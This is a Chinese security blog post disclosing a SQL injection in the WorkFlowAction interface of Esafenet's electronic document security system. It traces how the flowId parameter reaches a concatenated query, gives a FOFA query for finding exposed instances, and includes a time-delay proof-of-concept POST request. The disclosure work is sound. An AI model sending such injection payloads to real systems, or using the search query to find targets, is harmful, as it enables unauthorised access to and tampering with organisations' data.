---
title: "亿赛通电子文档安全管理系统 WorkFlowAction SQL注入漏洞"
source: https://mrxn.net/jswz/esafenet-WorkFlowAction-sqli-2.html
asset_dir: assets/亿赛通电子文档安全管理系统-workflowaction-sql注入漏洞
---

# 亿赛通电子文档安全管理系统 WorkFlowAction SQL注入漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/7/24 12:21
- 970浏览
- [0评论](#comment)
- 32分钟阅读

深入探索

软件

数据库

sql

---

# 漏洞简介

亿赛通电子文档安全管理系统的WorkFlowAction接口存在[SQL注入漏洞](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)。攻击者可以通过构造特定的POST请求，在flowId参数中注入恶意SQL代码，利用该漏洞对数据库执行任意SQL操作。攻击者可以通过注入WAITFOR DELAY命令，导致数据库响应时间延迟，从而确认[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)的成功。此漏洞可能导致数据库中的敏感信息泄露、篡改或删除，严重威胁系统的安全性和数据完整性。

Windows安全工具

# 影响版本

# fofa语法

> app="亿赛通-电子文档安全管理系统" || body="/CDGServer3/index.jsp"

# 漏洞分析

根据 web.xml 里对 `WorkFlowAction` 的定义

```
<servlet>
    <servlet-name>WorkFlowAction</servlet-name>
    <servlet-class>com.esafenet.mobile.WorkFlowAction</servlet-class>
</servlet>

<servlet-mapping>
    <servlet-name>WorkFlowAction</servlet-name>
    <url-pattern>/3g/WorkFlowAction</url-pattern>
</servlet-mapping>
```

可知，访问路由为 /3g/WorkFlowAction ，具体实现逻辑类为 `com.esafenet.mobile.WorkFlowAction` ，跟进查看`Approval`实现方式

SQL注入防护

```
public void actionApproval(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
        String fromurl = RequestUtil.getParameter(request, "fromurl", "");
        String flowId = RequestUtil.getParameter(request, "flowId", "");
        String opinion = RequestUtil.getParameter(request, "opinion", "");
        String approvalResult = RequestUtil.getParameter(request, "approvalResult", "");

        try {
            String userName = CDGUtil.getUserName(request);
            PageBean pageBean = new PageBean();
            pageBean.setCmd("updateOne");
            pageBean.setUsername(userName);
            pageBean.setToken("FEGBFCFEFAFKFCGC");
            pageBean.setFlowId(flowId);
            pageBean.setPasstype(approvalResult);
            pageBean.setComments(opinion);
            this.doworkflow.doProcessWork(pageBean);
        } catch (Exception e) {
            log.error("3g approval error:" + e);
        }

        request.getRequestDispatcher(fromurl).forward(request, response);
    }
```

将请求的参数这些带入`doProcessWork`方法

```
public PageBean doProcessWork(PageBean pageBean) throws Exception {
    try {
        String websendmail_ip = UserCache.weburlmap.get("httpserverIp") == null ? "127.0.0.1" : (String)UserCache.weburlmap.get("httpserverIp");
        String websendmail_port = UserCache.weburlmap.get("httpserverPort") == null ? "80" : (String)UserCache.weburlmap.get("httpserverPort");
        String flowId = pageBean.getFlowId();
        FlowDetail detail = this.dao.getAngecyflag(pageBean.getUsername(), flowId);
```

`flowId` 会被带入`getAngecyflag` 方法，跟进看下其实现逻辑

代码安全审计

```
public FlowDetail getAngecyflag(String username, String flowid) {
    Connection conn = null;
    PreparedStatement ps = null;
    ResultSet rs = null;
    StringBuffer sql = new StringBuffer("select fd.* from  workflowDetail fd where fd.approvaler='" + username + "' AND fd.dstatus ='1' AND flowID='" + flowid + "'");
    FlowDetail flowDetail = new FlowDetail();
    FlowDetail flowDetail = new FlowDetail();

    try {
        conn = DbConnectionManager.getConnection();
        ps = conn.prepareStatement(sql.toString());
        rs = ps.executeQuery();
```

深入探索

安全研究工具

物流软件安全

文件大小转换

可见参数`flowId`全程未经任何过滤和校验就被直接拼接进sql语句中进行执行，从而导致[sql注入漏洞](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)。

# 漏洞复现

```
POST /CDGServer3/3g/WorkFlowAction;Servicelogin HTTP/1.1
Host: esafenet.mrxn.net
Content-Type: application/x-www-form-urlencoded

command=Approval&userId=1&fromurl=getTodoList.jsp?curpage=111&flowId=111'%3bWAITFOR+DELAY+'0%3a0%3a4'--
```

[![亿赛通电子文档安全管理系统 WorkFlowAction SQL注入漏洞](images/img-001-77f2cff97cd1.webp)](https://image.mrxn.net/124aae559a9e4373ac4ec0c9dd2340b9.webp)

成功延时 4 秒

漏洞修复方案

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#Java](https://mrxn.net/tag/Java)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
